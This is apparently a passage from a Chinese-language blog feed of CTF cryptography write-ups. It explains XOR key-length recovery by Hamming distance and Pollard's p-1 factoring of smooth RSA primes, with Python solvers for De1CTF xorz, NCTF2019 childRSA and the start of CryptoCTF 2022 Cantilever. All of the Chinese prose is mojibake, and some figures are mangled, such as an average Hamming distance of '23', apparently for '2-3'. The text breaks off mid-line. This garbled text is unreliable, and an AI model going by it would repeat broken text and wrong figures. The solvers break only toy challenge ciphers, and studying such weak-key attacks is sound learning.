<p>è¿™é‡Œå°±å¯ä»¥ç”¨åˆ°æ±‰æ˜è·ç¦»æ¥çŒœè§£å¯†é’¥é•¿åº¦ã€‚å¿«é€Ÿæ±‚è§£æ±‰æ˜è·ç¦»çš„æ–¹æ³• å°±æ˜¯ å°†ç­‰é•¿å­—ç¬¦ä¸² è¿›è¡Œå¼‚æˆ–ã€‚ä¸¤ä¸ªäºŒè¿›åˆ¶å­—ç¬¦å¼‚æˆ–åè®¡ç®—å€¼ä¸º1çš„ æ¯”ç‰¹ä½æ ¼å¼ å°±æ˜¯æœ€åçš„æ±‰æ˜è·ç¦»ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hamming(&quot;1010&quot;, &quot;1111&quot;) == 2</span><br><span class="line">hamming(&quot;1111&quot;, &quot;0000&quot;) == 4</span><br><span class="line">hamming(&quot;1111&quot;, &quot;1111&quot;) == 0</span><br></pre></td></tr></table></figure>

<p>å¤§å†™å­—æ¯A-Z ascii 65-90 65å¯¹åº”äºŒè¿›åˆ¶ 01000001 90å¯¹åº”äºŒè¿›åˆ¶ 01011010</p>
<p>å°å†™å­—æ¯a-z ascii 97-122</p>
<p>65å¯¹åº”äºŒè¿›åˆ¶ 01000001</p>
<p>90å¯¹åº”äºŒè¿›åˆ¶ 01011010 å­—æ¯æ±‰æ˜è·ç¦»å¹³å‡ä¸º2-3</p>
<h6 id="æ±‰æ˜è·ç¦»-å¯†é’¥é•¿åº¦çŒœè§£ä¹‹é—´çš„è”ç³»ï¼š"><a href="#æ±‰æ˜è·ç¦»-å¯†é’¥é•¿åº¦çŒœè§£ä¹‹é—´çš„è”ç³»ï¼š" class="headerlink" title="æ±‰æ˜è·ç¦» å¯†é’¥é•¿åº¦çŒœè§£ä¹‹é—´çš„è”ç³»ï¼š"></a>æ±‰æ˜è·ç¦» å¯†é’¥é•¿åº¦çŒœè§£ä¹‹é—´çš„è”ç³»ï¼š</h6><p>ä¸¤ä¸ªä»¥ Asciiç¼–ç çš„è‹±æ–‡å­—ç¬¦ ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯ 23 æ‰€ä»¥æ­£å¸¸è‹±æ–‡å­—æ¯çš„è¯„ä»·æ±‰æ˜è·ç¦»ä¸º 23 ã€æ¯æ¯”ç‰¹ã€‘ï¼Œä»»æ„å­—ç¬¦ï¼ˆéçº¯å­—æ¯ï¼‰çš„ä¸¤ä¸¤æ±‰æ˜è·ç¦» å¹³å‡ä¸º4ã€‚</p>
<p>æ­£ç¡®åˆ†ç»„çš„å¯†æ–‡ä¸å¯†æ–‡ç›´æ¥çš„æ±‰æ˜è·ç¦» ç­‰äºæ˜æ–‡ä¸æ˜æ–‡ä¹‹é—´çš„æ±‰æ˜è·ç¦»ã€é€šè¿‡æŒ‰æ­£ç¡®å¯†é’¥é•¿åº¦åˆ†ç»„çš„å¯†æ–‡ä¸å¯†æ–‡å¼‚æˆ–ç­‰äºæ˜æ–‡ä¸æ˜æ–‡å¼‚æˆ–è¯æ˜ã€‘</p>
<p>æ‰€ä»¥ å½“ä½¿ç”¨æ­£ç¡®çš„å¯†é’¥é•¿åº¦åï¼Œä¸¤ä¸¤å­—æ¯è¿›è¡Œè®¡ç®—æ±‰æ˜è·ç¦»ï¼Œè¿™ä¸ªå€¼ä¼šè¶‹äºæœ€å°ã€‚</p>
<h5 id="3-å¯†æ–‡è§£å¯†"><a href="#3-å¯†æ–‡è§£å¯†" class="headerlink" title="3.å¯†æ–‡è§£å¯†"></a>3.å¯†æ–‡è§£å¯†</h5><p>1.å¼‚æˆ–åŠ å¯†ä¸­ ä½¿ç”¨ç›¸åŒå¯†é’¥åŠ å¯†çš„æ˜æ–‡å’Œå¯†æ–‡åŠ å­˜åœ¨è¿™ä¸ªè§„å¾‹ï¼š å¯†æ–‡å’Œå¯†æ–‡å¼‚æˆ– ç­‰äº æ˜æ–‡å’Œæ˜æ–‡å¼‚æˆ–ã€‚</p>
<p>2.ç©ºæ ¼å’Œæ‰€æœ‰å°å†™å­—æ¯å¼‚æˆ–çš„ç»“æœæ˜¯å¯¹åº”çš„å¤§å†™å­—æ¯ï¼› ç©ºæ ¼å’Œæ‰€æœ‰å¤§å†™å­—æ¯å¼‚æˆ–çš„ç»“æœæ˜¯å¯¹åº”çš„å°å†™å­—æ¯ã€‚</p>
<p>é™¤ç©ºæ ¼å¤–ï¼Œæœ‰äº›ç»„åˆå¯å‡ºç°å¼‚æˆ–ç»“æœæ˜¯å¤§å°å†™å­—æ¯ï¼Œä½†æ˜¯ç©ºæ ¼å‡ºç°æ—¶ï¼Œç»“æœåœ¨å¤§å°å†™å­—æ¯é—´çš„æ¦‚ç‡æœ€å¤§ã€‚</p>
<p>ç›´æ¥ç”¨æ–‡ç« çš„è½®å­Orz <a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a>  ç¬¬ä¸€æ­¥å»æ‰saltåå³å¯ç›´æ¥ä½¿ç”¨</p>
<h4 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">a, b</span>):     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt; <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a[:<span class="built_in">len</span>(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b[:<span class="built_in">len</span>(a)])])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hamming_distance</span>(<span class="params">b1, b2</span>):</span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += <span class="built_in">bin</span>(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"><span class="comment"># text = &#x27;&#x27;</span></span><br><span class="line"><span class="comment"># with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span></span><br><span class="line"><span class="comment">#     for line in f:</span></span><br><span class="line"><span class="comment">#         text += line</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = base64.b64decode(text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">break_single_key_xor</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2=cycle(salt)</span><br><span class="line">nosalt=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp=c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int=<span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re= <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt=nosalt+temp_re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b=binascii.a2b_hex(nosalt)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="comment">#æˆ‘ä»¬å–å…¶ä¸­å‰6æ®µè®¡ç®—å¹³å±€æ±‰æ˜è·ç¦»</span></span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = <span class="built_in">float</span>(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6)</span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = <span class="built_in">sorted</span>(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = <span class="built_in">bytearray</span>(keys * <span class="built_in">len</span>(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>





<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/">https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/</a></p>
<p><a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>RSAå…‰æ»‘æ•°é—®é¢˜ - å¾…å®Œæˆ</title>
    <url>/posts/20e69e95/</url>
    <content><![CDATA[<p>ç®€è¿°</p>
<p>å…‰æ»‘æ•°ã€Smooth numberã€‘ï¼š æŒ‡ å¯ä»¥åˆ†è§£ä¸ºå°ç´ æ•°ä¹˜ç§¯çš„æ­£æ•´æ•°</p>
<p>B-Smoothæ•°ï¼š å¦‚æœä¸€ä¸ªæ•´æ•°çš„æ‰€æœ‰ç´ å› å­éƒ½ä¸å¤§äºB é‚£ç§°è¿™ä¸ªæ•°ä½B-Smoothæ•°ã€ä¾‹å¦‚ 12 = 2<em>2</em>3 æ‰€ä»¥ 12æ˜¯3-Smoothæ•°ã€‘</p>
<p>å½“pæ˜¯Nçš„å› æ•°ï¼Œå¹¶ä¸” p-1 æ˜¯ å…‰æ»‘æ•°ï¼Œå¯ä»¥è€ƒè™‘   Pollardâ€™s p-1 ç®—æ³•åˆ†è§£N</p>
<p>å½“pæ˜¯Nçš„å› æ•°ï¼Œå¹¶ä¸” p+1 æ˜¯ å…‰æ»‘æ•°ï¼Œå¯ä»¥è€ƒè™‘  Williamsâ€™s p+1 ç®—æ³•æ¥åˆ†è§£N</p>
<h3 id="p-1å…‰æ»‘"><a href="#p-1å…‰æ»‘" class="headerlink" title="p-1å…‰æ»‘"></a>p-1å…‰æ»‘</h3><p>æ ¹æ®è´¹é©¬å°å®šç† </p>
<p><img src="/posts/20e69e95/1.png"></p>
<p>æœ‰ï¼š  è‹¥p âˆ¤ a, åˆ™a^(pâˆ’1) â‰¡ 1 (mod p)</p>
<p>åˆ™æœ‰ï¼š a^t*(pâˆ’1) â‰¡ 1^t â‰¡ 1 (mod p)</p>
<p>å³   a^(p-1) -1 = k*p  ã€$a^{t(p-1)} - 1$ æ˜¯ $p$ çš„å€æ•° ã€‘</p>
<h4 id="Pollardâ€™s-p-1ç®—æ³•ï¼š"><a href="#Pollardâ€™s-p-1ç®—æ³•ï¼š" class="headerlink" title="Pollardâ€™s p-1ç®—æ³•ï¼š"></a>Pollardâ€™s p-1ç®—æ³•ï¼š</h4><p>å¦‚æœ p-1 æ˜¯å¾ˆå°è´¨æ•°çš„ä¹˜ç§¯  é‚£ä¹ˆ n! å°±èƒ½è¢« p-1 æ•´é™¤ã€‚  å³ n! = t(p-1)   ã€ (p-1) | B! ã€‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = powmod(a, n, N)</span><br><span class="line">    res = gcd(a-<span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="NCTF2019-childRSA"><a href="#NCTF2019-childRSA" class="headerlink" title="[NCTF2019] childRSA"></a>[NCTF2019] childRSA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrime</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)  <span class="comment"># primes ä¸ºå‰10000ä¸ªç´ æ•°çš„åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p, q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line"><span class="comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br></pre></td></tr></table></figure>

<p>p q å‡å±æœ‰ å¤šä¸ªå°æŒ‡æ•°ä¹˜ç§¯+1 å¾—åˆ°    å³ p-1ä¸ºå¤šä¸ªå°æŒ‡æ•°çš„ä¹˜ç§¯ã€‚åˆ©ç”¨ Pollarâ€™s p-1ç®—æ³•åˆ†è§£N</p>
<p>WP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">C = <span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥å¥— Pollard&#x27;s p-1ç®—æ³• æ±‚å‡º p q </span></span><br><span class="line"><span class="comment"># pyä¸‹è·‘ sageè·‘æœ‰é—®é¢˜</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = powmod(a, n, N)</span><br><span class="line">    res = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>, res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = invert(e, (res - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(C, d, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;NCTF&#123;Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="CryptoCTF-2022-Cantilever-60-solves"><a href="#CryptoCTF-2022-Cantilever-60-solves" class="headerlink" title="CryptoCTF 2022 Cantilever (60 solves) *"></a>CryptoCTF 2022 Cantilever (60 solves) *</h3><blockquote>
<p>What if you can find the message? If you can, that means you are genius, because we harden our crypto system with a very modern tool!</p>
</blockquote>
<p>Challenge</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_primes</span>(<span class="params">nbit, imbalance</span>):</span><br><span class="line">    p = <span class="number">2</span></span><br><span class="line">    FACTORS = [p]</span><br><span class="line">    <span class="keyword">while</span> p.bit_length() &lt; nbit - <span class="number">2</span> * imbalance:</span><br><span class="line">        factor = getPrime(imbalance)</span><br><span class="line">        FACTORS.append(factor)</span><br><span class="line">        p *= factor</span><br><span class="line">    rbit = (nbit - p.bit_length()) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r, s = [getPrime(rbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;01&#x27;</span>]</span><br><span class="line">        _p = p * r * s</span><br><span class="line">        <span class="keyword">if</span> _p.bit_length() &lt; nbit: rbit += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> _p.bit_length() &gt; nbit: rbit -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(_p + <span class="number">1</span>):</span><br><span class="line">            FACTORS.extend((r, s))</span><br><span class="line">            p = _p + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    FACTORS.sort()</span><br><span class="line">    <span class="keyword">return</span> (p, FACTORS)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">nbit, imbalance, e</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p, FACTORS = gen_primes(nbit // <span class="number">2</span>, imbalance)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(FACTORS) != <span class="built_in">len</span>(<span class="built_in">set</span>(FACTORS)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q, q_factors = gen_primes(nbit // <span class="number">2</span>, imbalance + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(q_factors) != <span class="built_in">len</span>(<span class="built_in">set</span>(q_factors)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        factors = FACTORS + q_factors</span><br><span class="line">        <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> factors:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> n, (p, q)</span><br><span class="line"></span><br><span class="line">nbit = <span class="number">2048</span></span><br><span class="line">imbalance = <span class="number">19</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">m_1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>])</span><br><span class="line">m_2 = bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">n, PRIMES = genkey(nbit, imbalance, e)</span><br><span class="line"></span><br><span class="line">c_1 = <span class="built_in">pow</span>(m_1, e, n)</span><br><span class="line">c_2 = <span class="built_in">pow</span>(e, m_2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_1 = <span class="subst">&#123;c_1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_2 = <span class="subst">&#123;c_2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>p-1 å…‰æ»‘ </p>
<p>n  2^19-smooth</p>
<p>åˆ©ç”¨ Pollard p-1 ç®—æ³•åˆ†è§£n</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">7069789930583271525053215046247773438899869283661158227309691853515987055334306019600324056376312479212090202373516405860759222837585952590589336295698718699890424169542280710721069784487366121478569760563045886361884895363592898476736269784284754788133722060718026577238640218755539268465317292713320841554802703379684173485217045274942603346947299152498798736808975912326592689302969859834957202716983626393365387411319175917999258829839695189774082810459527737342402920881184864625678296442001837072332161966439361793009893108796934406114288057583563496587655548536011677451960307597573257032154009427010069578913</span></span><br><span class="line">c_1 = <span 